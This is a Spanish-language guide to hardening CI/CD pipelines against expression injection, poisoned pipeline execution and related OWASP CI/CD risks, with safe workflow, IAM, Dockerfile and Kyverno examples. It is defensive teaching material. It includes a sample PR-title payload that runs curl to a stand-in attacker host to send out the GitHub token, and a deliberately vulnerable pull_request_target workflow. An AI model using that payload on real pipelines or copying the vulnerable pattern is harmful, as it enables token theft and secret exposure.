# Hardening de Pipelines CI/CD contra Inyección de Expresiones y PPE

Esta referencia técnica define las directivas de seguridad para flujos de trabajo de Integración y Despliegue Continuo (**GitHub Actions**, **GitLab CI**, **Tekton**), mitigando de forma integral `VULN-CONF-014` y los riesgos del catálogo **OWASP CI/CD Top 10**.

---

## 🏛️ 1. Taxonomía OWASP CI/CD Top 10

| Código | Riesgo | Mecanismo de Falla | Salvaguarda Técnica |
| :--- | :--- | :--- | :--- |
| **CICD-SEC-1** | Insufficient Flow Control | Push directo a producción por cuenta única sin revisión | Branch protection obligatoria y Two-Party Review |
| **CICD-SEC-2** | Inadequate IAM | Identidades no humanas con privilegios excesivos | Tokens efímeros OIDC y principio de menor privilegio |
| **CICD-SEC-3** | Dependency Chain Abuse | Confusión de nombres y secuestro de dependencias en build | Namespaces corporativos protegidos e integridad de lockfiles |
| **CICD-SEC-4** | Poisoned Pipeline Execution (PPE) | Ejecución arbitraria vía Pull Request o comandos de test | Aislamiento estricto de triggers y sandbox efímero |
| **CICD-SEC-5** | Insufficient PBAC | Linters y tests acceden a los mismos secretos que deploy | Segregación de secretos por entorno y privilegios mínimos |
| **CICD-SEC-6** | Insufficient Credential Hygiene | Claves fijas en repo o expuestas en logs de ejecución | Workload Identity (OIDC) y enmascaramiento activo |
| **CICD-SEC-7** | Insecure System Configuration | Runners con configuraciones por defecto o permisos root | Runners efímeros inmutables e imágenes base hardened |
| **CICD-SEC-8** | Ungoverned Usage of 3rd Party Actions | Acciones referenciadas por tags mutables (@v4, @main) | Fijación obligatoria por commit SHA-1 de 40 dígitos |
| **CICD-SEC-9** | Improper Artifact Integrity | Despliegue de binarios sin verificar firmas o atestaciones | Firmas Cosign y atestaciones SLSA v1.0 en contenedores |
| **CICD-SEC-10** | Insufficient Logging & Visibility | Falta de auditoría de descargas de artefactos y secretos | Centralización de logs de runners hacia SIEM institucional |

---

## ⚡ 2. Inyección de Expresiones en GitHub Actions (CICD-SEC-4)

### Mecanismo de Explotación
El evaluador de GitHub Actions resuelve las expresiones `${{ ... }}` antes de despachar el comando al intérprete de shell. Si una variable controlada por un tercero (título de un PR, cuerpo de un comentario, nombre de rama) se interpola directamente en el bloque `run:`, se produce ejecución arbitraria de comandos (RCE):

```yaml
# PATRÓN VULNERABLE: Inyección directa en shell
- name: Log Pull Request Title
  run: echo "Titulo: ${{ github.event.pull_request.title }}"
  # Un título como: "feat: algo\"; curl https://attacker.com/steal?token=$GITHUB_TOKEN; #"
  # ejecuta el payload con los privilegios del runner.
```

### Patrón Seguro: Aislamiento Mandatorio en Variables `env:`
```yaml
# PATRÓN SANEADO: Inyección neutralizada como dato literal
- name: Log Pull Request Title
  env:
    SAFE_PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Titulo: $SAFE_PR_TITLE"
```
Al pasarlo por `env:`, el sistema operativo lo almacena en la tabla de variables del proceso como cadena literal, neutralizando comillas, operadores de concatenación (`;`, `&&`) y subshells (`$()`).

---

## 🚨 3. Antipatrón `pull_request_target` y Exfiltración de Secretos

El evento `pull_request_target` se ejecuta en el contexto de la rama base y posee acceso a los secretos del repositorio. Si el workflow realiza un checkout del commit del PR proveniente de un fork ajeno:

```yaml
# PATRÓN ALTAMENTE PELIGROSO: Exposición masiva de secretos a forks externos
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # VULNERABLE
      - run: npm install && npm test # Ejecuta código malicioso del PR con los secretos del repo base
```

### Directiva de Aislamiento
1. En flujos con `pull_request_target`, **jamás hacer checkout del código del fork**.
2. Si se requiere probar el código de un PR externo, utilizar el evento estándar `pull_request`, el cual se ejecuta en un contexto de solo lectura sin acceso a secretos de producción.

---

## 🔒 4. Fijación Inmutable de Acciones y Autenticación OIDC

### 4.1. Fijación por Commit SHA-1 Inmutable
```yaml
# Inseguro: Tag mutable susceptible a secuestro de cuenta del mantenedor
- uses: actions/checkout@v4

# Seguro: Hash SHA-1 inmutable de 40 dígitos con comentario informativo
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

### 4.2. Federación Cloud Keyless vía OIDC
```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Autenticación Cloud Federada OIDC
        uses: aws-actions/configure-aws-credentials@e3ddf1e3cb007943e750660077d149ec48be02f6 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsDeployRole
          aws-region: us-east-1
```

Política de confianza en AWS IAM anclada a la rama de producción:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:my-org/core-repo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

---

## 🐳 5. Contenedores Distroless y Políticas Kyverno

```dockerfile
# Multi-etapa Distroless con usuario sin privilegios
FROM node:20-bookworm-slim AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .

FROM gcr.io/distroless/nodejs20-debian12:nonroot
WORKDIR /app
COPY --from=builder --chown=nonroot:nonroot /app /app
USER nonroot
EXPOSE 8080
CMD ["server.js"]
```

Política de admisión en Kubernetes con Kyverno (Pod Security Restricted):
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: enforce-restricted-pod-security
spec:
  validationFailureAction: Enforce
  rules:
  - name: disallow-privileged-containers
    match:
      any:
      - resources:
          kinds: [Pod]
    validate:
      message: "Violación de Pod Security Standard Restricted: privilegios elevados detectados."
      pattern:
        spec:
          containers:
          - securityContext:
              privileged: false
              allowPrivilegeEscalation: false
              readOnlyRootFilesystem: true
              runAsNonRoot: true
```
